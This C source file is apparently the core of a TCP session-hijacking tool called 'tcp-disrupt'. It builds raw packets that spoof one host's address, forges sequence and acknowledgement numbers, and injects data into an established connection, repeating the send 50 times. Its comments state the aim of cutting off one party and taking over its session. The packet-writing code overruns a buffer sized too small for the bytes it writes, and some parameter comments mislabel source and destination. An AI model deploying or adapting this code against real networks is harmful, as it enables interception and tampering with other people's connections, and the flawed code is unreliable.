#include "tcp-disrupt.h"

static const struct option longOpts[] = {
    { "client", required_argument, NULL, 'c' },
    { "server", required_argument, NULL, 's' },
    { "port", required_argument, NULL, 'p' },
    { "interface", required_argument, NULL, 'i' },
    { NULL, no_argument, NULL, 0 }
};

static const char *optString = "p:c:s:i:h?";

int main(int argc, char **argv) {
    int     opt         = 0;
    int     longIndex   = 0;
    char    *clientIP   = NULL;
    char    *serverIP   = NULL;
    char    *interface  = NULL;
    char    *serverPort = NULL;

    while((opt = getopt_long(argc, argv, optString, longOpts, &longIndex)) != -1) {
        switch( opt ) {
            case 'c':
                clientIP = optarg; 
                break;
            case 's':
                serverIP = optarg;
                break;
            case 'i':
                interface = optarg;
                break;
            case 'p':
                serverPort = optarg;
                break;     
            case 'h':   /* h or --help */
            case '?':
                display_usage(argv[0]);
                exit(EXIT_SUCCESS);
                break;     
            default:
                /* Shouldn't get here */
                break;
        }
    }

/* For now, these will not need to be mandatory: 
    if(clientIP == NULL) {
        fprintf(stderr, "Client IP address was not provided.\n");
        display_usage(argv[0]);
        return EXIT_FAILURE;
    }

    if(serverIP == NULL) {
        fprintf(stderr, "Server IP address was not provided.\n");
        display_usage(argv[0]);
        return EXIT_FAILURE;
    }
    // TODO: Remove this
    if(interface != NULL) {
        printf("Interface %s\n", interface);
    }
*/

    int result = tcpDisrupt(clientIP, serverIP, serverPort, interface);
    if (result){
        fprintf(stderr, "[FAIL] Failed to sniff the network. Quitting.\n");
        exit(result);
    }
 
    return 0;
}

/**
 * Prints out the usage string of this program.
 * @param name String containing the name of the program.
 */
void display_usage(char *name) {
    printf("%s --client client_ip --server server_ip [--port server_port] [--interface interface]\n", name);
}


/**
 * Throw off the connection between two hosts in an already established TCP session.
 * The function should save the state of the sequence and ack numbers between calls.
 *
 * The end goal is to leave the source IP without a connection and we will hijack
 * the connection state with the destination, continuing to send data.
 *
 * If this function is currently attempting to disrupt the session, it will simply return to it's caller after the 
 * attempt to disrupt is made.
 *
 * If this function has successfully disrupted the session, it should handle the events that
 * take place after the connection has been hijacked.
 *
 * Once the function has been hijacked, and the desired actions have been taken on the hijacked session, this function should exit tcp-disrupt. 
 *
 * @param serverIP          String representation of the source's IP address.
 * @param serverPort        The port used by the source in the TCP session being hijacked.
 * @param clientIP     String representation of the destination's IP address.
 * @param clientPort   The port used by the destination in the TCP session being hijacked.
 * @param sequenceNumber    The sequence number to be acknowledged by the desination.
 * @param ackNumber         The last sequence number acknowledged by the source.
 */
void disrupt_session(char *serverIP, uint16_t serverPort, char *clientIP, uint16_t clientPort, uint32_t sequenceNumber, uint32_t ackNumber, int timestamp, int finalRound) {
    static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 ];
    
    // Socket FD
    int sock, one = 1;

    // Amounts to increase ack and seq by
    uint32_t ack_inc, seq_inc;

    //Address struct to sendto()
    struct sockaddr_in addr_in;

    // Initialize static values if they have never been set
    ack_inc = 1;
    seq_inc = 1;

    printf("[disrupt_session]: New Sequence Number: %u\n", sequenceNumber + seq_inc);
    printf("[disrupt_session]: New ACK: %u\n\n", ackNumber + ack_inc);

    //Raw socket without any protocol-header inside
    if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Error while creating socket\n");
        exit(-1);
    }

    //Set option IP_HDRINCL (headers are included in packet)
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
        perror("Error while setting socket options\n");
        exit(-1);
    }

    //Populate address struct
    addr_in.sin_family = AF_INET;
    addr_in.sin_port = htons(clientPort);
    addr_in.sin_addr.s_addr = inet_addr(clientIP);


    int z = 50;
    while(z--){
        printf("Sending {\"srcIP\":\"%s\", \"dstIP\":\"%s\", \"dstPort\":%d, \"srcPort\":%d, \"SYN\":%d, \"ACK\":%d, \"ACK_NUM\":%u, \"SYN_NUM\":%u, \"RST\":%d, \"data\":\"%s\"}", 
            clientIP, serverIP, serverPort, clientPort, SYN_OFF, ACK_ON, ackNumber+ack_inc, sequenceNumber+seq_inc, RESET_OFF, "X");
        fill_packet(serverIP,
                    clientIP,
                    clientPort,
                    serverPort,
                    SYN_OFF,
                    ACK_ON,
                    PSH_ON,
                    ackNumber + ack_inc,
                    sequenceNumber + seq_inc,
                    RESET_OFF,
                    "X",
                    packet,
                    sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 + 12);

        char *nopPtr = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x08;
        nopPtr++;
        *nopPtr = 0x0a;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 0x01;
        nopPtr++;
        *nopPtr = 'Q';
        nopPtr++;
        *nopPtr = '\0';

        // Send out the packet
        printf("Sending Packet! Result: %d\n", send_packet(sock, packet, addr_in));
    }

    if(finalRound){
        exit(0);
    }

}